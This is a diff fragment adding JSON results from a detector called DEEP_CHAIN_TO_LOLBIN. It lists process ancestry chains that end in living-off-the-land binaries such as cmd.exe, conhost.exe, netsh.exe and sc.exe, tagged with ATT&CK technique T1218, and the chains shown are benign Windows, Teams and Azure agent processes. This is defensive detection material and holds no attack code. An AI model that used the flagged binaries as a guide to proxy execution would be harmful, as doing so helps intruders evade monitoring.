+          "lolbin_name": "teams.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\Update.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bed-5ead-df00-000000000500",
+          "image": "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
+          "lolbin_name": "teams.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\Update.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bef-5ead-e100-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\WindowsAzure\\SecAgent\\WaSecAgentProv.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bf0-5ead-e400-000000000500",
+          "image": "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
+          "lolbin_name": "teams.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\Update.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bf1-5ead-e500-000000000500",
+          "image": "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
+          "lolbin_name": "teams.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\Update.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bf3-5ead-e700-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\WindowsAzure\\SecAgent\\WaSecAgentProv.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bfe-5ead-ec00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\WindowsAzure\\SecAgent\\WaSecAgentProv.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bfe-5ead-ef00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\WindowsAzure\\SecAgent\\WaSecAgentProv.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c06-5ead-f200-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\WindowsAzure\\Packages\\CollectGuestLogs.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c20-5ead-f400-000000000500",
+          "image": "C:\\Windows\\System32\\sc.exe",
+          "lolbin_name": "sc.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\sc.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c20-5ead-f700-000000000500",
+          "image": "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe",
+          "lolbin_name": "onedrivestandaloneupdater.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c20-5ead-f900-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\DeviceCensus.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c20-5ead-f800-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\sc.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c29-5ead-0001-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c29-5ead-0101-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.Security.IaaSAntimalware\\1.5.5.9\\AntimalwareConfig.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c29-5ead-0201-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c29-5ead-0401-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c29-5ead-0501-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c29-5ead-0601-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c29-5ead-0701-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c29-5ead-0801-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c29-5ead-0a01-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c45-5ead-1c01-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\DeviceCensus.exe",
+            "C:\\Windows\\System32\\DeviceCensus.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c54-5ead-1e01-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\WindowsAzure\\Packages\\CollectGuestLogs.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c54-5ead-1f01-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\WindowsAzure\\Packages\\CollectGuestLogs.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2c9d-5ead-2301-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\dsregcmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7d2-5f51-5800-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_054718\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7d4-5f51-5a00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\dsregcmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7d5-5f51-6000-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_054718\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7d5-5f51-6100-000000000500",
+          "image": "C:\\Windows\\System32\\netsh.exe",
+          "lolbin_name": "netsh.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1587.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7d5-5f51-6300-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1587.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7d8-5f51-6600-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1587.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe",
+            "C:\\Windows\\System32\\dispdiag.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7d9-5f51-6700-000000000500",
+          "image": "C:\\Windows\\System32\\netsh.exe",
+          "lolbin_name": "netsh.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1587.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7d9-5f51-6800-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1587.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7da-5f51-6a00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_054718\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\logman.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "3ddc5665-e7db-5f51-6c00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_054718\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\ipconfig.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
